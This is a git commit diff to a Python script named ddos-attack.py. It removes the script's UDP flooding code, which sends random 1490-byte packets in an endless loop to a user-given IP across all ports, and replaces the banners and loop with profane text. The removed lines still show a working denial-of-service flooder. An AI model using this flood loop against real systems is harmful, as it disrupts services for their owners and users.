a83eb9030bf50f6cf475a65f36faadfd4646e752
Theodore Cooper <63190431+theodorecooper@users.noreply.github.com>
2022-01-08 10:15:05 +0000

    uPDATE sHIT

--- ddos-attack.py
+++ ddos-attack.py
@@ -1,24 +1,5 @@
-import sys
-import os
-import time
-import socket
-import random
-#Code Time
-from datetime import datetime
-now = datetime.now()
-hour = now.hour
-minute = now.minute
-day = now.day
-month = now.month
-year = now.year
-
-##############
-sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes = random._urandom(1490)
-#############
-
 os.system("clear")
-os.system("figlet DDos Attack")
+os.system("figlet SHIT")
 print
 print "Author   : HA-MRX"
 print "You Tube : https://www.youtube.com/c/HA-MRX"
@@ -29,7 +10,7 @@ ip = raw_input("IP Target : ")
 port = input("Port       : ")
 
 os.system("clear")
-os.system("figlet Attack Starting")
+os.system("figlet F*CK Starting")
 print "[                    ] 0% "
 time.sleep(5)
 print "[=====               ] 25%"
@@ -42,10 +23,5 @@ print "[====================] 100%"
 time.sleep(3)
 sent = 0
 while True:
-     sock.sendto(bytes, (ip,port))
-     sent = sent + 1
-     port = port + 1
-     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
-     if port == 65534:
-       port = 1
+     print "IT'S FUCKIN' SHIT!!!"
 
